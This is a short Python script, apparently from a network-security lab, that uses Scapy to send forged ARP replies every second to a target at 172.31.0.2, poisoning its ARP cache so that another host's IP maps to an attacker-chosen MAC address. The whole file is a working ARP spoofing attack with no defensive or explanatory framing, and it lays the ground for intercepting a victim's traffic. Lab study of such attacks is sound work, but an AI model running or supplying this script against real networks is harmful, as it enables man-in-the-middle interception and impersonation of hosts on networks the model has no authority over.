
from scapy.all import *
import sys

def arp_poisoning(target_ip, target_mac, spoofed_ip, spoofed_mac):
    # Craft the ARP packet
    arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc=spoofed_mac)
    
    # Send the ARP packet
    send(arp_packet, verbose=False)

# Define the target machine (A) and the attacker machine (M)
target_ip = "172.31.0.2"
target_mac = "00:16:3e:ae:c3:fd"
spoofed_ip = "172.31.0.3"
spoofed_mac = "00:16:3e:3d:17:94"

while True:
    arp_poisoning(target_ip, target_mac, spoofed_ip, spoofed_mac)
    time.sleep(1)  # Adjust the sleep duration as needed
    sys.stdout.flush()
    print("ARP cache poisoning complete!")

# Perform ARP cache poisoning
